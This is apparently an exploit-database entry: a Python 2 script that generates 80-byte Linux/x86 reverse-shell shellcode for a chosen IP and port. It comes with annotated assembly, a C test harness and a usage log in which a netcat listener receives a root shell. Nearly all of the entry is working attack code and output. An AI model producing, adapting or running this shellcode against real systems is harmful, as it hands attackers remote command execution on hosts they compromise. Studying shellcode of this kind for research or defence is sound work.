@@ -1,0 +1,160 @@
+id: 34328
+date: 04/27/2020
+title: Linux/x86 Reverse Shell Generator Shellcode (80 bytes)
+author: Bobby Cooke
+cves: 
+
+## Title: Linux/x86 - Reverse Shell Generator - Customizable TCP Port & IP Address (80 bytes)
+## Exploit Author: Bobby Cooke
+## Tested on: Ubuntu 16.04.6 - 4.15.0-45-generic x86 i686
+## Usage:
+####################### TERMINAL 1 ############################
+##  root# ip addr | grep 172
+##    inet 172.16.65.131/24
+##  root# python revsh.py 
+##    Enter TCP Port Number: 31337
+##    Your TCP Port in Hex is: \x7a\x69
+##    Enter IP Address [127.1.1.1]: 172.16.65.131
+##    Your IP Address in Hex is: \xac\x10\x41\x83
+##    Choose your shellcode export format.
+##    [1] = C Format
+##    [2] = Python Format
+##    [1]: 1
+##    [----------------Your-Shellcode------------------]
+##    unsigned char shellcode[] = \
+##    "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
+##    "\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\xac\x10"
+##    "\x41\x83\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10"
+##    "\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
+##    "\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
+##    "\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+##    "\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
+##  root# cat shellcode.c 
+##    // sudo gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+##    // 127.1.1.1 1337
+##    #include<stdio.h>
+##    #include<string.h>
+##    unsigned char shellcode[] = \
+##    "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
+##    "\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\xac\x10"
+##    "\x41\x83\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10"
+##    "\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
+##    "\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
+##    "\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+##    "\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
+##    int main()
+##    {
+##      printf("Shellcode Length:  %d\n", strlen(shellcode));
+##      int (*ret)() = (int(*)())shellcode;
+##      ret();
+##    }
+##  root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+##  root# ./shellcode 
+##    Shellcode Length:  80
+####################### TERMINAL 2 ############################
+##  root@ubuntu:/home/beta# nc -nlvp 31337
+##    Listening on [0.0.0.0] (family 0, port 31337)
+##    Connection from [172.16.65.131] port 31337
+##    id
+##    uid=0(root) gid=0(root) groups=0(root)
+
+port = raw_input("Enter TCP Port Number: ")
+deciPort = int(port)                # string to int
+hexPort = "{:02x}".format(deciPort) # int to hex
+hexStrLen = len(hexPort)
+oddEven = hexStrLen % 2             # string length even or odd?
+if oddEven == 1:                    # if odd, add a leading 0
+    hexPort = "0" + hexPort
+# convert the port number into the correct hex format
+tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
+print "Your TCP Port in Hex is:","\\x"+tcpPort
+nullCheck = deciPort % 256
+if nullCheck == 0 :
+    print "Your TCP Port contains a Null 0x00."
+    print "Try again with a different Port Number."
+    exit(0)
+ipAddrStr = raw_input("Enter IP Address [127.1.1.1]: ")
+if ipAddrStr == "" :
+        ipAddrStr = "127.1.1.1"
+formatIP = ipAddrStr.split('.')
+hexIP = '{:02x}{:02x}{:02x}{:02x}'.format(*map(int, formatIP))
+# converts the ip address into the correct hex format
+ipAddr = "\\x".join(hexIP[i:i+2] for i in range(0,len(hexIP), 2))
+print "Your IP Address in Hex is:","\\x"+ipAddr
+
+## Shellcode
+scPart1 =  "\x31\xc0" # xor eax, eax
+scPart1 += "\xb0\x66" # mov al, 0x66   ; EAX = 0x66 = SYSCALL 102 - socketcall 
+scPart1 += "\x31\xdb" # xor ebx, ebx
+
+scPart1 += "\x43"     # inc ebx        ; EBX = 0x1 = socket() // Create a socket
+scPart1 += "\x31\xc9" # xor ecx, ecx
+scPart1 += "\x51"     # push ecx
+scPart1 += "\x53"     # push ebx
+scPart1 += "\x6a\x02" # push dword 0x2 ; AF_INET.  
+scPart1 += "\x89\xe1" # mov ecx, esp
+scPart1 += "\xcd\x80" # int 0x80       ; System Call Interrupt 0x80 - Executes socket().
+scPart1 += "\x96"     # xchg esi, eax  ; socket file descriptor returned to EAX Register, save in ESI
+scPart1 += "\x31\xc0" # xor eax, eax
+scPart1 += "\x43"     # inc ebx
+scPart1 += "\x68"     # push dword
+#ipAddr = "\x7f\x01\x01\x01" # IP 127.1.1.1
+scPart2 = "\x66\x68"  # Push Word
+# tcpPort = "\x05\x39" # TCP Port 1337
+scPart3 = "\x66\x53"  # push bx        ; 0x2 = AF_INET.
+scPart3 += "\x89\xe1" # mov ecx, esp
+scPart3 += "\x6a\x10" # push 0x10      ; Length of SockAddr Struct is 16 bytes long
+scPart3 += "\x51"     # push ecx
+scPart3 += "\x56"     # push esi       ; socket file descriptor
+scPart3 += "\x89\xe1" # mov ecx, esp   ; Point ECX to the top of the loaded stack.
+scPart3 += "\x43"     # inc ebx        ; Connect() value for the socketcall() SYSCAL
+scPart3 += "\xb0\x66" # mov al, 0x66   ; socketcall() system call
+scPart3 += "\xcd\x80" # int 0x80       ; System Call Interrupt 0x80
+scPart3 += "\x87\xde" #  xchg ebx, esi
+scPart3 += "\x31\xc9" # xor ecx, ecx
+# dup2loop:
+scPart3 += "\xb0\x3f" # mov al, 0x3f   ; EAX Syscall dup2() for STDIN STDOUT STDERR
+scPart3 += "\xcd\x80" # int 0x80       ; execute dup2()
+scPart3 += "\x41"     # inc ecx
+scPart3 += "\x80\xf9\x04" # cmp cl, 0x4; compare cl to 4, if it is 4 the flag will be set 
+scPart3 += "\x75\xf6" # jne dup2loop   ; Jumps to the specified location flag is set
+scPart3 += "\x31\xd2" # xor edx, edx
+scPart3 += "\x52"     # push edx
+scPart3 += "\x68\x2f\x2f\x73\x68" # push 0x68732f2f ; "hs//"
+scPart3 += "\x68\x2f\x62\x69\x6e" # push 0x6e69622f ; "nib/"
+scPart3 += "\x89\xe3" # mov ebx, esp   ; point ebx to stack
+scPart3 += "\xb0\x0b" # mov al, 0xb    ; execve syscall
+scPart3 += "\x31\xc9" # xor ecx, ecx
+scPart3 += "\xcd\x80" # int 0x80       ; execute execve
+
+shellcode = "" 
+
+# Add the first part of the tcp bind shellcode
+for x in bytearray(scPart1) :
+    shellcode += '\\x'
+    shellcode += '%02x' %x
+# Add the user input id address to the shellcode
+shellcode += "\\x"+ipAddr
+# Add the second part of the tcp bind shellcode
+for x in bytearray(scPart2) :
+    shellcode += '\\x'
+    shellcode += '%02x' %x
+# Add the user added tcp port to the shellcode
+shellcode += "\\x"+tcpPort
+# Add the third part of the tcp bind shellcode
+for x in bytearray(scPart3) :
+    shellcode += '\\x'
+    shellcode += '%02x' %x
+
+print "Choose your shellcode export format."
+exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
+if exportFormat == "2" :
+    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
+    print "[-----------------------Your-Shellcode------------------------]"
+    print 'shellcode = "'+formatSC+'"'
+else :
+    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
+    print "[----------------Your-Shellcode------------------]"
+    print 'unsigned char shellcode[] = \\\n"'+formatSC+'";'
+
+#  0day.today [2023-03-21]  #
